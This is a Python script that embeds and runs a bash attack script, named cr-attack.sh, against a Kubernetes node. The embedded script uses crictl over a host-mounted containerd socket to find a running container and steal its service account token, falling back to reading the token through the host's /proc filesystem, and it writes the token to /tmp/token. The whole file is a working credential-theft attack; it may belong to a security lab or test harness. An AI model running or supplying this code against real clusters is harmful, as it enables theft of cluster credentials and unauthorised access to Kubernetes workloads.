#!/usr/bin/env python3
"""Python entrypoint for cr-attack.sh."""

from __future__ import annotations

import os
import stat
import subprocess
import sys
import tempfile
from pathlib import Path

_SCRIPT = r"""#!/usr/bin/env bash
set -euo pipefail

RUNTIME_SOCKET="${CRICTL_RUNTIME_PATH:-/host/run/containerd/containerd.sock}"
TARGET_CONTAINER="${CRICTL_TARGET_CONTAINER:-traffic-controller}"
TOKEN_OUT="${TOKEN_OUT:-/tmp/token}"
TOKEN_PATH="/var/run/secrets/kubernetes.io/serviceaccount/token"

cat >/etc/crictl.yaml <<YAML
runtime-endpoint: unix://${RUNTIME_SOCKET}
image-endpoint: unix://${RUNTIME_SOCKET}
timeout: 10
debug: false
YAML

find_target_container() {
  local cid

  cid="$(crictl ps -q --name "${TARGET_CONTAINER}" | head -n1 || true)"
  if [[ -n "${cid}" ]]; then
    printf '%s\n' "${cid}"
    return 0
  fi

  while IFS= read -r cid; do
    [[ -z "${cid}" ]] && continue
    if crictl exec "${cid}" sh -c "test -r '${TOKEN_PATH}'" >/dev/null 2>&1; then
      printf '%s\n' "${cid}"
      return 0
    fi
  done < <(crictl ps -q)

  return 1
}

CID="$(find_target_container || true)"
if [[ -z "${CID}" ]]; then
  echo "No running container with a readable serviceaccount token found." >&2
  exit 1
fi

if crictl exec "${CID}" sh -c "cat '${TOKEN_PATH}'" >"${TOKEN_OUT}" 2>/dev/null; then
  echo "Token collected from container ${CID} into ${TOKEN_OUT}"
  exit 0
fi

PID="$(crictl inspect -o go-template --template '{{.info.pid}}' "${CID}" 2>/dev/null || true)"
if [[ -n "${PID}" ]] && crictl exec -i "${CID}" cat "/host/proc/${PID}/root${TOKEN_PATH}" >"${TOKEN_OUT}" 2>/dev/null; then
  echo "Token collected via host proc from container ${CID} into ${TOKEN_OUT}"
  exit 0
fi

echo "Failed to collect a serviceaccount token from container ${CID}." >&2
exit 1
"""


def _run_embedded_bash(script: str, argv: list[str]) -> int:
    """Run the embedded legacy payload through Bash with a Python-owned entrypoint."""
    try:
        current = Path(__file__).resolve()
        for parent in current.parents:
            lib_dir = parent / "lib"
            if (lib_dir / "common" / "shell.py").is_file():
                sys.path.insert(0, str(lib_dir))
                break
        from common.shell import run_embedded_bash
        return run_embedded_bash(script, argv)
    except Exception:
        with tempfile.NamedTemporaryFile("w", encoding="utf-8", suffix=".sh", delete=False) as handle:
            handle.write(script)
            path = handle.name
        try:
            Path(path).chmod(Path(path).stat().st_mode | stat.S_IXUSR)
            completed = subprocess.run(["/usr/bin/env", "bash", path, *argv], text=True)
            return int(completed.returncode)
        finally:
            try:
                os.unlink(path)
            except FileNotFoundError:
                pass


def main() -> None:
    raise SystemExit(_run_embedded_bash(_SCRIPT, sys.argv[1:]))


if __name__ == "__main__":
    main()
